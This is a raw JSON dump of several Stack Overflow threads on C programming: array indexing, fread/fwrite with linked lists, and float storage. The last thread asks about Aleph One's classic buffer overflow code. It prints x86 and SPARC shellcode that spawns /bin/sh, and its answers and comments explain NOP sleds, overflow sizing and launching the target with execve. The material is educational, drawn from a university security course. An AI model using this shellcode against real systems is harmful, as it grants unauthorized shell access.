thing.</p>\n\n<p>Something like :</p>\n\n<pre><code>#define WIDTH 10\n#define HEIGHT 10\n\nchar grid[ WIDTH * HEIGHT ] ;\n\n#define ELEMENT(row,column)    grid[ ( (row)*WIDTH ) + (column) ]\n\n/* Read an element */\n\nchar c ;\n\nc = ELEMENT( 5, 7 ) ;\n\n/* write to an element */\n\nELEMENT( 5, 7 ) = 'x' ;\n\n/* access the array in 1D is trivial as you simply use grid[] directly */\n</code></pre>\n\n<p>So you can use the same 1D array as a 2D item without duplication.</p>\n\n<p>One important point : avoid post- and pre- decrement operations when using macros.  The reason for this is that they can lead to confusing errors, as macros are not functions and each \"parameter\" of the macro is simply text that replaces the corresponding macro \"parameter\".</p>\n"}], "owner": {"reputation": 309, "user_id": 5459423, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/502d3ef40cd7b946e08b2d48cfb3e7ae?s=128&d=identicon&r=PG&f=1", "display_name": "askque", "link": "https://stackoverflow.com/users/5459423/askque"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 973, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1449663861, "creation_date": 1449656977, "question_id": 34176484, "link": "https://stackoverflow.com/questions/34176484/conversion-from-2d-array-to-1d", "title": "conversion from 2d array to 1d", "body": "<p>I have 2D array as a grid that can be thought a game board. When the board is initialized so the game is started there are four men. It works for <code>nxn</code> grid. As an example</p>\n\n<pre><code>x o\no x\n</code></pre>\n\n<p>I do it using a 2D array. Now, I try to convert the array to 1D. I'm stuck on how I can put the symbols on the grid for 1D array.</p>\n\n<pre><code>for(int i = 0; i &lt; row; ++i)\n    for(int j = 0; j &lt; col; ++j)\n    {\n        //grid[i][j] = '.';\n        grid[i * col + j] = '.'; // I've converted the part\n    }\n\n    int centerh = row / 2;\n    int centerw = col / 2;\n\n    // I'm stuck that part.\n\n    grid[centerh][centerw] = 'o';\n    grid[centerh - 1][centerw - 1] = 'o';\n\n    grid[centerh][centerw - 1] = 'x';\n    grid[centerh - 1][centerw] = 'x';\n</code></pre>\n"}, {"tags": ["c", "fwrite", "fread"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1449657116, "post_id": 34176229, "comment_id": 56099560, "body": "You have not closed the file in <code>printRecords()</code>"}], "answers": [{"comments": [{"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 1, "creation_date": 1449657052, "post_id": 34176323, "comment_id": 56099524, "body": "On Linux systems the <code>b</code> flag has no effect. So before providing this as an answer it would be good to clarify whether the OP is running on Linux. If it is Linux then this probably isn&#39;t the answer."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1449657290, "post_id": 34176323, "comment_id": 56099660, "body": "Binary mode is advisable and necessary on some platforms such as Windows, but it is not the only problem with the code."}, {"owner": {"reputation": 49, "user_id": 5658556, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/10153768174668221/picture?type=large", "display_name": "Mohammed Al-Huneidi", "link": "https://stackoverflow.com/users/5658556/mohammed-al-huneidi"}, "edited": false, "score": 0, "creation_date": 1449690879, "post_id": 34176323, "comment_id": 56121835, "body": "Yes, I am running on linux, I&#39;ve implemnted chqrlie&#39;s fix, but now I am getting seg faults and am trying to figure it out. my struct and head node are declared as global variables, hope this can be useful to say as well."}], "tags": [], "owner": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "is_accepted": false, "score": 1, "last_activity_date": 1449657427, "last_edit_date": 1495542192, "creation_date": 1449656570, "answer_id": 34176323, "question_id": 34176229, "link": "https://stackoverflow.com/questions/34176229/fread-fwrite-not-working-as-expected/34176323#34176323", "title": "fread/fwrite not working as expected", "body": "<p>To <a href=\"https://stackoverflow.com/questions/17598572/read-write-to-binary-files-in-c\">read write to binary files in  c</a>.</p>\n\n<pre><code>FILE   *fPointer=fopen(\"data.bin\",\"wb\");  //to write file\nFILE *fPointer=fopen(\"data.bin\",\"rb\");    //to read file\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 49, "user_id": 5658556, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/10153768174668221/picture?type=large", "display_name": "Mohammed Al-Huneidi", "link": "https://stackoverflow.com/users/5658556/mohammed-al-huneidi"}, "edited": false, "score": 0, "creation_date": 1449690677, "post_id": 34176538, "comment_id": 56121726, "body": "Thank you so much for your answers, however I forgot to note that I am running on linux, thus that might be a problem. I am currently getting seg faults after I implemented your fixes, I don&#39;t know why exactly."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 49, "user_id": 5658556, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/10153768174668221/picture?type=large", "display_name": "Mohammed Al-Huneidi", "link": "https://stackoverflow.com/users/5658556/mohammed-al-huneidi"}, "edited": false, "score": 0, "creation_date": 1449690904, "post_id": 34176538, "comment_id": 56121848, "body": "@MohammedAl-Huneidi: post your corrected program to a pastebin, there must be some other bug."}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 1, "last_activity_date": 1449659132, "last_edit_date": 1449659132, "creation_date": 1449657128, "answer_id": 34176538, "question_id": 34176229, "link": "https://stackoverflow.com/questions/34176229/fread-fwrite-not-working-as-expected/34176538#34176538", "title": "fread/fwrite not working as expected", "body": "<p>There are multiple problems with your code.</p>\n\n<p><code>printRecords</code> has problems:</p>\n\n<ul>\n<li>you should use binary mode.</li>\n<li>you write the contents of the pointer and some indeterminate contents instead of whet the  pointer points to.  This is actually undefined behavior.</li>\n<li>you forgot to close the file.</li>\n<li>the value written to the file for the <code>next</code> member is meaningless.  Writing the same records may produce different file contents for different runs.</li>\n</ul>\n\n<p>Here is a corrected version that returns the number of records written or -1 if the file could not be opened:</p>\n\n<pre><code>int printRecords(void) {\n    FILE *fPointer = fopen(\"data.bin\", \"wb\");\n    studentList *sp;\n    int n = 0;\n\n    if (fPointer == NULL)\n        return -1;\n\n    /* Loop through linked list starting from head node */\n    for (sp = head; sp != NULL; sp = sp-&gt;next) {\n        n += fwrite(sp, sizeof(newStudent), 1, fPointer);\n    }\n    fclose(fPointer);\n    return n;\n}\n</code></pre>\n\n<p><code>loadRecords</code> has even more problems:</p>\n\n<ul>\n<li>binary mode should be used too.</li>\n<li>the way you test for end of file is incorrect.</li>\n<li>the way you link records does not work either.</li>\n</ul>\n\n<p>Here is a corrected version of <code>loadRecords</code> that returns the number of records read or -1 if the file could not be opened:</p>\n\n<pre><code>int loadRecords(void) {\n    studentList student, *newsp, *sp;\n    FILE *fPointer = fopen(\"data.bin\", \"rb\");\n    int n = 0;\n\n    if (fPointer == NULL)\n        return -1;\n\n    while (fread(&amp;student, sizeof(student), 1, fPointer) == 1) {\n        n++;\n        student.next = NULL;  // value read from file is meaningless\n        newsp = malloc(sizeof(studentList));\n        *newsp = student;\n        if (head == NULL) {\n            head = newsp;\n        } else {\n            /* append the new record to the list */\n            for (sp = head; sp-&gt;next; sp = sp-&gt;next)\n                continue;\n            sp-&gt;next = newsp;\n        }\n    }\n    fclose(fPointer);\n    return n;\n}\n</code></pre>\n\n<p>Be aware that storing binary data to the file system this way is not portable.  The representation of integers and floats may differ from one platform to another, as well as alignment of the structure members, especially the <code>next</code> pointer which is useless in the file anyway.  This file should only be read back on the same platform, with the same program that wrote it, making it a poor choice for backup or persistent storage.</p>\n"}, {"tags": [], "owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "is_accepted": false, "score": 0, "last_activity_date": 1449657660, "creation_date": 1449657660, "answer_id": 34176723, "question_id": 34176229, "link": "https://stackoverflow.com/questions/34176229/fread-fwrite-not-working-as-expected/34176723#34176723", "title": "fread/fwrite not working as expected", "body": "<p>There are problems in the file write function, mainly the data pointer and size:</p>\n\n<pre><code>void printRecords(){\n    FILE *fPointer = fopen(\"data.bin\",\"wb\");    // add \"b\" mode (MSVC)\n    if (fPointer == NULL)                       // check file opened\n        exit(1);                                // or report \"Cannot open file\"\n    studentList *newStudent = head;\n    while(newStudent !=NULL)\n    {\n        fwrite(newStudent, sizeof(*newStudent), 1, fPointer);   // remove the &amp; and add a *\n        newStudent = newStudent-&gt;next;\n    }\n    if (fclose(fPointer))                       // close the file\n        exit(1);                                // or report \"Failed to close file\"\n}\n</code></pre>\n"}], "owner": {"reputation": 49, "user_id": 5658556, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/10153768174668221/picture?type=large", "display_name": "Mohammed Al-Huneidi", "link": "https://stackoverflow.com/users/5658556/mohammed-al-huneidi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1172, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1449661829, "creation_date": 1449656308, "last_edit_date": 1449661829, "question_id": 34176229, "link": "https://stackoverflow.com/questions/34176229/fread-fwrite-not-working-as-expected", "title": "fread/fwrite not working as expected", "body": "<p>So I am trying to write a c file that has a student record database, once the file runs it is supposed to read student records from a binary file and add them to a linked list: the student struct looks like this :</p>\n\n<pre><code>typedef struct student {\n    char lname[10], initial, fname[10];\n    unsigned long SID;\n    float GPA;\n\n    struct student* next; /* pointer to the next student record */   \n} studentList;\n</code></pre>\n\n<p>I am using single linked lists for my data, and my code runs fine if I read and write the data with fscanf. However, once I started using fwrite and fread, everytime my program loads it would not load up the data from the text file correctly, when I check the binary file it seems it has data in it. Here is what I have for my load and write data functions:</p>\n\n<pre><code>void printRecords() {\n    FILE *fPointer = fopen(\"data.bin\", \"w\");\n    studentList *newStudent = head;\n    while (newStudent != NULL) { /*Loop through linked list starting from head node*/\n        fwrite(&amp;newStudent, sizeof(newStudent), 1, fPointer);\n\n        newStudent = newStudent-&gt;next;\n    }\n}\n\nvoid loadRecords() {\n    studentList *cStudent;\n    FILE *fPointer = fopen(\"data.bin\", \"r\");\n    int counter = 0;\n    int x = 0;\n    int n = 0;\n    while (n != 0) {\n        printf(\"test\\n\");\n        if (fPointer == NULL) {\n            break;\n        }\n        cStudent = (studentList *)malloc(sizeof(studentList));\n        n = fread(&amp;cStudent, sizeof(cStudent), 1, fPointer);\n        x = cStudent-&gt;GPA;\n        printf(\"%d\\n\", x);\n        if (feof(fPointer)) { break; }\n        if (counter == 0) {\n            head = cStudent;\n            temp = (studentList *)malloc(sizeof(studentList));\n            temp = cStudent;\n            counter++;\n        }\n\n        temp-&gt;next = (studentList *)malloc(sizeof(studentList));\n        temp-&gt;next = cStudent;\n        temp = temp-&gt;next;\n    }\n    fclose(fPointer);\n}\n</code></pre>\n\n<p>so what am I doing wrong as right now it does not read anything into my list, it seems like it writes but not sure if it even writes the correct data, I have spent a long time trying to figure this out and have been stuck on it for a while now, thanks in advance.</p>\n"}, {"tags": ["c", "floating-point", "storage"], "comments": [{"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 3, "creation_date": 1449654477, "post_id": 34175495, "comment_id": 56097808, "body": "The representation of any data type is always <i>implementation-defined</i>."}, {"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1449654519, "post_id": 34175495, "comment_id": 56097832, "body": "Here is one <a href=\"https://en.wikipedia.org/wiki/IEEE_754-1985\" rel=\"nofollow noreferrer\">popular representation</a> for floating point numbers."}, {"owner": {"reputation": 6024, "user_id": 2417459, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/QcuXb.png?s=128&g=1", "display_name": "i486", "link": "https://stackoverflow.com/users/2417459/i486"}, "edited": false, "score": 0, "creation_date": 1449654540, "post_id": 34175495, "comment_id": 56097846, "body": "Use Google to find explanation about floating point encoding. Or simply open Wikipedia."}, {"owner": {"reputation": 11138, "user_id": 1015327, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/00d71e011fc61cad60c5ffc9bf48c5ef?s=128&d=identicon&r=PG", "display_name": "JimmyB", "link": "https://stackoverflow.com/users/1015327/jimmyb"}, "edited": false, "score": 0, "creation_date": 1449654943, "post_id": 34175495, "comment_id": 56098107, "body": "It does it the same way as your 10-digit calculator displays large numbers: In scientific notation 1.23456789E42 = 1.23456789*10^42. The precision may still not be more than 10 digits although the numer is much bigger. Check what happens when you calculate (1e50+1)-1e50, you <i>should</i> be getting 1 as result, but you&#39;ll probably end up with 0."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1449654981, "post_id": 34175495, "comment_id": 56098133, "body": "There is no such thing as <i>the last bit</i>.  The most significant bit is almost universally used as a sign bit for signed integer representations."}], "answers": [{"comments": [{"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1449654885, "post_id": 34175577, "comment_id": 56098068, "body": "Besides theory, these articles would provide the OP with details on an actual rather common implementation: <a href=\"https://en.wikipedia.org/wiki/Single-precision_floating-point_format\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/Single-precision_floating-point_format</a> and <a href=\"https://en.wikipedia.org/wiki/Double-precision_floating-point_format\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/Double-precision_floating-point_format</a>"}], "tags": [], "owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "is_accepted": false, "score": 5, "last_activity_date": 1449654561, "creation_date": 1449654561, "answer_id": 34175577, "question_id": 34175495, "link": "https://stackoverflow.com/questions/34175495/how-the-float-or-double-values-are-stored-in-variables-in-c/34175577#34175577", "title": "How the float or double values are stored in variables in C?", "body": "<p>The C language does not <em>require</em> any <em>specific</em> representation for <a href=\"https://en.wikipedia.org/wiki/Floating_point\" rel=\"nofollow\">floating point</a> numbers.</p>\n\n<p>Today, most C implementations are using <a href=\"https://en.wikipedia.org/wiki/IEEE_floating_point\" rel=\"nofollow\">IEEE floating numbers</a> (exceptions are unusual, perhaps some <a href=\"https://en.wikipedia.org/wiki/Z/Architecture\" rel=\"nofollow\">Series Z</a> mainframes from IBM).</p>\n\n<p>Read <a href=\"http://floating-point-gui.de/\" rel=\"nofollow\">http://floating-point-gui.de/</a></p>\n"}, {"comments": [{"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1449654683, "post_id": 34175579, "comment_id": 56097943, "body": "Also document double precision: <a href=\"https://en.wikipedia.org/wiki/Double-precision_floating-point_format\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/Double-precision_floating-point_format</a>  The OP seems somewhat confused: he mentions <code>double</code> where he means <code>float</code>.  Also document that this is only an implementation, the most common one, but not the only one."}], "tags": [], "owner": {"reputation": 2532, "user_id": 801362, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/51f6486eab3b090bd0a3a4d6cc24cee3?s=128&d=identicon&r=PG", "display_name": "Ward", "link": "https://stackoverflow.com/users/801362/ward"}, "is_accepted": false, "score": 5, "last_activity_date": 1449654567, "creation_date": 1449654567, "answer_id": 34175579, "question_id": 34175495, "link": "https://stackoverflow.com/questions/34175495/how-the-float-or-double-values-are-stored-in-variables-in-c/34175579#34175579", "title": "How the float or double values are stored in variables in C?", "body": "<p>The complete explanation can be found <a href=\"https://en.wikipedia.org/wiki/Single-precision_floating-point_format\">here</a> . Basically, the number is not fully stored, only approximately. The 32 bits are used to store as much precision as possible.</p>\n"}], "owner": {"reputation": 777, "user_id": 5658353, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/f5285671b1d6a76f3e63f8de98ecae02?s=128&d=identicon&r=PG&f=1", "display_name": "Nimit Bhardwaj", "link": "https://stackoverflow.com/users/5658353/nimit-bhardwaj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1344, "favorite_count": 1, "closed_date": 1449664508, "answer_count": 2, "score": 3, "last_activity_date": 1449654567, "creation_date": 1449654356, "last_edit_date": 1449654469, "question_id": 34175495, "link": "https://stackoverflow.com/questions/34175495/how-the-float-or-double-values-are-stored-in-variables-in-c", "closed_reason": "Duplicate", "title": "How the float or double values are stored in variables in C?", "body": "<p>I was reading the way, how integers are stored in variables in c, that the last bit is used for the sign of the integer and the remaining bits are used to store the number.</p>\n\n<p>But if we take a double variable and the long int variable in c, both has a size of 4 bytes but the float can store the very huge numbers up to a range of 10<sup>38</sup> but long int of same size cant store such huge value.</p>\n\n<hr>\n\n<p>I want to understand the mechanism which is used in storage in float.</p>\n"}, {"tags": ["c", "assembly", "buffer-overflow", "exploit", "shellcode"], "comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1449655255, "post_id": 34175409, "comment_id": 56098337, "body": "Please don&#39;t ask about help with malware development here as a refusal, and down/close vote, often offends."}, {"owner": {"reputation": 9443, "user_id": 3050403, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/YRND8.jpg?s=128&g=1", "display_name": "kelin", "link": "https://stackoverflow.com/users/3050403/kelin"}, "reply_to_user": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1449656498, "post_id": 34175409, "comment_id": 56099152, "body": "@MartinJames, there are so many questions about malware last time. Any ideas why?"}, {"owner": {"reputation": 197, "user_id": 5035667, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/10206575284718595/picture?type=large", "display_name": "Elad Doocker", "link": "https://stackoverflow.com/users/5035667/elad-doocker"}, "edited": false, "score": 0, "creation_date": 1449657954, "post_id": 34175409, "comment_id": 56100129, "body": "why wont ask?? im doing this for research not for anything that will cause damage to someone...the valunarble program is a program from my studies..."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1449658536, "post_id": 34175409, "comment_id": 56100530, "body": "There are, but please understand that it&#39;s not a personal issue:)  Whenever I see &#39;buffer overflow&#39;, &#39;exploit&#39;, &#39;vulnerability&#39; etc. I just auto down and close vote.  If it has a whiff of malware, I always respond in that manner.  &#39; im doing this for research&#39; - I&#39;m sure you understand that malware developers lie.  I&#39;m not saying that you are, but you may be."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1449659183, "post_id": 34175409, "comment_id": 56100956, "body": "All those &quot;shell code&quot; exploits only work on specific environments and with specific compilers."}, {"owner": {"reputation": 197, "user_id": 5035667, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/10206575284718595/picture?type=large", "display_name": "Elad Doocker", "link": "https://stackoverflow.com/users/5035667/elad-doocker"}, "edited": false, "score": 0, "creation_date": 1449662154, "post_id": 34175409, "comment_id": 56102761, "body": "well if i will put here the valunarble program i want to use it on it will help??"}], "answers": [{"comments": [{"owner": {"reputation": 197, "user_id": 5035667, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/10206575284718595/picture?type=large", "display_name": "Elad Doocker", "link": "https://stackoverflow.com/users/5035667/elad-doocker"}, "edited": false, "score": 0, "creation_date": 1449763424, "post_id": 34183210, "comment_id": 56157356, "body": "thank you for your help!!! can you please tell me if there is any way to find the buffer address without using gdb?? because the program i need to buffer overflow wasent compiled with gdb flag..."}, {"owner": {"reputation": 7289, "user_id": 3736955, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/1647d5d7348d070ae95df49253385ee1?s=128&d=identicon&r=PG", "display_name": "Jemshit Iskenderov", "link": "https://stackoverflow.com/users/3736955/jemshit-iskenderov"}, "reply_to_user": {"reputation": 197, "user_id": 5035667, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/10206575284718595/picture?type=large", "display_name": "Elad Doocker", "link": "https://stackoverflow.com/users/5035667/elad-doocker"}, "edited": false, "score": 0, "creation_date": 1449763551, "post_id": 34183210, "comment_id": 56157437, "body": "i have got it with gdb, i dont know other ways"}, {"owner": {"reputation": 197, "user_id": 5035667, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/10206575284718595/picture?type=large", "display_name": "Elad Doocker", "link": "https://stackoverflow.com/users/5035667/elad-doocker"}, "edited": false, "score": 0, "creation_date": 1449882489, "post_id": 34183210, "comment_id": 56213771, "body": "ok thanks and another question...do you know what is the use of align as a parameter for aleph one eggshell.c code??"}, {"owner": {"reputation": 7289, "user_id": 3736955, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/1647d5d7348d070ae95df49253385ee1?s=128&d=identicon&r=PG", "display_name": "Jemshit Iskenderov", "link": "https://stackoverflow.com/users/3736955/jemshit-iskenderov"}, "reply_to_user": {"reputation": 197, "user_id": 5035667, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/10206575284718595/picture?type=large", "display_name": "Elad Doocker", "link": "https://stackoverflow.com/users/5035667/elad-doocker"}, "edited": false, "score": 0, "creation_date": 1449912254, "post_id": 34183210, "comment_id": 56219011, "body": "\u0130 think it just fills egg with nop[], from starting from end of nop[] to beginning or vice versa. That nop[] with size 4 is for sparc system, not for linux. On linux NOP instruction =x90"}, {"owner": {"reputation": 197, "user_id": 5035667, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/10206575284718595/picture?type=large", "display_name": "Elad Doocker", "link": "https://stackoverflow.com/users/5035667/elad-doocker"}, "edited": false, "score": 0, "creation_date": 1449914449, "post_id": 34183210, "comment_id": 56219579, "body": "yea i know but his function get the align as one of the parameters but how can i know how much NOPs i need??"}, {"owner": {"reputation": 7289, "user_id": 3736955, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/1647d5d7348d070ae95df49253385ee1?s=128&d=identicon&r=PG", "display_name": "Jemshit Iskenderov", "link": "https://stackoverflow.com/users/3736955/jemshit-iskenderov"}, "reply_to_user": {"reputation": 197, "user_id": 5035667, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/10206575284718595/picture?type=large", "display_name": "Elad Doocker", "link": "https://stackoverflow.com/users/5035667/elad-doocker"}, "edited": false, "score": 0, "creation_date": 1449914818, "post_id": 34183210, "comment_id": 56219675, "body": "You dont need to, it fills egg with NOP until shellcode fits at the end. Check outer for loop there. NOP is just skipping instruction which does not do anything. So when E\u0130P points to any  address  which NOP is located, it skips to next adress until it finds executable instruction which is shellcode in this case. \u0130 am not sure how many bytes you should overwrite in sparc, in linux x86 if you have 200 size buffer, you just need 208 byte buffer to overflow it. 4 byte for sfp and 4 byte for return address. Filling first bytes of buffer with NOP and last bytes until index 200 with shellcode"}], "tags": [], "owner": {"reputation": 7289, "user_id": 3736955, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/1647d5d7348d070ae95df49253385ee1?s=128&d=identicon&r=PG", "display_name": "Jemshit Iskenderov", "link": "https://stackoverflow.com/users/3736955/jemshit-iskenderov"}, "is_accepted": true, "score": 1, "last_activity_date": 1536991530, "last_edit_date": 1536991530, "creation_date": 1449676450, "answer_id": 34183210, "question_id": 34175409, "link": "https://stackoverflow.com/questions/34175409/aleph-one-code-buffer-overflow/34183210#34183210", "title": "Aleph one code - buffer overflow", "body": "<blockquote>\n  <p>Question is not about malware development, it is content of security class at many universities !</p>\n</blockquote>\n\n<p>The target program must accept input if you want to run this buffer overflow on it. You start target program with <a href=\"http://www.badprog.com/unix-gnu-linux-system-calls-using-execve\" rel=\"nofollow noreferrer\">execve</a> system call which's arguments are location of program and arguments array.</p>\n\n<p>You get address with <code>get_sp()</code> from <em>shellcode.h</em>, you get <code>shellcode</code> from <em>shellcode.h</em> and you fill your <strong>buffer</strong> (which will overflow) inside <em>eggshell.c</em>. Then you start target program with <code>execve()</code> giving <strong>buffer</strong> as argument and overflow will occur, which will open you shell.</p>\n\n<p>Sample exploit example can be <a href=\"https://github.com/rmferrer/cs155/blob/master/pa/pa1/sploits/sploit1.c\" rel=\"nofollow noreferrer\">found here</a> and its <a href=\"https://github.com/rmferrer/cs155/blob/master/pa/pa1/targets/target1.c\" rel=\"nofollow noreferrer\">target is here</a>. It does not use <code>get_sp</code>, addresses are harcoded there.</p>\n\n<p><em>Update</em>: links are broken. You can find similar repositories on google with search keyword <em>\"sploit1.c target1.c site:github.com\"</em></p>\n"}], "owner": {"reputation": 197, "user_id": 5035667, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/10206575284718595/picture?type=large", "display_name": "Elad Doocker", "link": "https://stackoverflow.com/users/5035667/elad-doocker"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1337, "favorite_count": 1, "closed_date": 1449677827, "accepted_answer_id": 34183210, "answer_count": 1, "score": -3, "last_activity_date": 1536991530, "creation_date": 1449654103, "last_edit_date": 1449660450, "question_id": 34175409, "link": "https://stackoverflow.com/questions/34175409/aleph-one-code-buffer-overflow", "closed_reason": "Needs more focus", "title": "Aleph one code - buffer overflow", "body": "<p>I got this code of aleph one:</p>\n\n<h2>shellcode.h</h2>\n\n<pre><code>#if defined(__i386__) &amp;&amp; defined(__linux__)\n\n#define NOP_SIZE    1\nchar nop[] = \"\\x90\";\nchar shellcode[] =\n  \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\"\n  \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\"\n  \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\";\n\nunsigned long get_sp(void) {\n   __asm__(\"movl %esp,%eax\");\n}\n\n#elif defined(__sparc__) &amp;&amp; defined(__sun__) &amp;&amp; defined(__svr4__)\n\n#define NOP_SIZE    4\nchar nop[]=\"\\xac\\x15\\xa1\\x6e\";\nchar shellcode[] =\n  \"\\x2d\\x0b\\xd8\\x9a\\xac\\x15\\xa1\\x6e\\x2f\\x0b\\xdc\\xda\\x90\\x0b\\x80\\x0e\"\n  \"\\x92\\x03\\xa0\\x08\\x94\\x1a\\x80\\x0a\\x9c\\x03\\xa0\\x10\\xec\\x3b\\xbf\\xf0\"\n  \"\\xdc\\x23\\xbf\\xf8\\xc0\\x23\\xbf\\xfc\\x82\\x10\\x20\\x3b\\x91\\xd0\\x20\\x08\"\n  \"\\x90\\x1b\\xc0\\x0f\\x82\\x10\\x20\\x01\\x91\\xd0\\x20\\x08\";\n\nunsigned long get_sp(void) {\n  